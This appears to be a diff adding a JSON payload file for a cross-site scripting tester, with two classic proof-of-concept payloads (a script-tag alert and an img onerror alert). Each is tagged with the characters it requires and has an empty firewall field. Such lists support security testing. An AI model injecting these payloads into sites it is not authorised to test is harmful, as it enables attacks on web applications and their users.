@@ -1,0 +1,12 @@
+[
+    {
+        "Payload": "<script>alert('XSS')</script>",
+        "Attribute": ["<", ">", "=", "script"],
+        "waf": ""
+    },
+    {
+        "Payload": "<img src=x onerror=alert('XSS')>",
+        "Attribute": ["<", ">", "=", "img", "onerror"],
+        "waf": ""
+    }
+]
